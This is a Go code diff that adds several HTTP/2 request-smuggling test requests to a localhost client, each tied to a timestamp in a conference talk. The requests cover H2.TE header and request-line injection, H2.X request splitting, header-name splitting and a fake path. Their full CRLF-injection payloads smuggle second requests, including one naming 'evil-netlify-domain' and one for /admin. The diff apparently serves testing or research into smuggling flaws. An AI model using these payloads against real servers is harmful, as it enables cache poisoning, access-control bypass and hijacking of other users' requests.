@@ -64,4 +64,93 @@ func main() {
 	req1.Unsafe = true
 	resp, err = client.Do(req1)
 	log.Println(resp, err)
+
+	// https://youtu.be/gAnDUoq1NzQ?t=992 - H2.TE via request header injection
+	payload = "0\r\n\r\nGET / HTTP/1.1\r\nHost: evil-netlify-domain\r\nContent-Length: 5\r\n\r\nx="
+	req1, err = http.NewRequest(http.MethodPost, "http://localhost:80/", strings.NewReader(payload))
+	if err != nil {
+		log.Fatal(err)
+	}
+	req1.Header[":authority"] = []string{"start.mozilla.org"}
+	req1.Header["foo"] = []string{"b\r\n"}
+	req1.Header["transfer-encoding"] = []string{"chunked"}
+	req1.AutomaticContentLength = false
+	req1.AutomaticHostHeader = false
+	req1.AutomaticUserAgent = false
+	req1.AutomaticAcceptEndocing = false
+	req1.AutomaticScheme = false
+	req1.Unsafe = true
+	resp, err = client.Do(req1)
+	log.Println(resp, err)
+
+	// https://youtu.be/gAnDUoq1NzQ?t=1135 - H2.X via request splitting
+	req1, err = http.NewRequest(http.MethodGet, "http://localhost:80/", nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	req1.Header[":authority"] = []string{"eco.atlassian.net"}
+	req1.Header["foo"] = []string{"bar\r\nHost: eco.atlassian.net\r\n\r\nGET /robots.txt HTTP/1.1\r\nX-Ignore: x"}
+	req1.AutomaticContentLength = false
+	req1.AutomaticHostHeader = false
+	req1.AutomaticUserAgent = false
+	req1.AutomaticAcceptEndocing = false
+	req1.AutomaticScheme = false
+	req1.Unsafe = true
+	resp, err = client.Do(req1)
+	log.Println(resp, err)
+
+	// https://youtu.be/gAnDUoq1NzQ?t=1261 - H2.TE via request line injection
+	req1, err = http.NewRequest(http.MethodGet, "http://localhost:80/ignored", nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	req1.Header[":method"] = []string{"GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x"}
+	req1.AutomaticContentLength = false
+	req1.AutomaticHostHeader = false
+	req1.AutomaticUserAgent = false
+	req1.AutomaticAcceptEndocing = false
+	req1.AutomaticScheme = false
+	req1.AutomaticMethod = false
+	req1.Unsafe = true
+	resp, err = client.Do(req1)
+	log.Println(resp, err)
+
+	// https://youtu.be/gAnDUoq1NzQ?t=2092 - Header name splitting
+	req1, err = http.NewRequest(http.MethodPost, "http://localhost:80/", nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	req1.Header[":method"] = []string{"POST"}
+	req1.Header[":authority"] = []string{"redacted.net"}
+	req1.Header["transfer-encoding: chunked"] = []string{""}
+	req1.Header["host: pares.net"] = []string{"443"}
+	req1.AutomaticContentLength = false
+	req1.AutomaticHostHeader = false
+	req1.AutomaticUserAgent = false
+	req1.AutomaticAcceptEndocing = false
+	req1.AutomaticScheme = false
+	req1.AutomaticMethod = false
+	req1.Unsafe = true
+	resp, err = client.Do(req1)
+	log.Println(resp, err)
+
+	// https://youtu.be/gAnDUoq1NzQ?t=2092 - fake path
+	req1, err = http.NewRequest(http.MethodPost, "http://localhost:80/", nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	req1.Header[":method"] = []string{"GET /admin HTTP/1.1"}
+	req1.Header[":path"] = []string{"/fakepath"}
+	req1.Header[":authority"] = []string{"pares.net"}
+	req1.AutomaticContentLength = false
+	req1.AutomaticHostHeader = false
+	req1.AutomaticUserAgent = false
+	req1.AutomaticAcceptEndocing = false
+	req1.AutomaticScheme = false
+	req1.AutomaticMethod = false
+	req1.AutomaticPath = false
+	req1.Unsafe = true
+	resp, err = client.Do(req1)
+	log.Println(resp, err)
+
 }
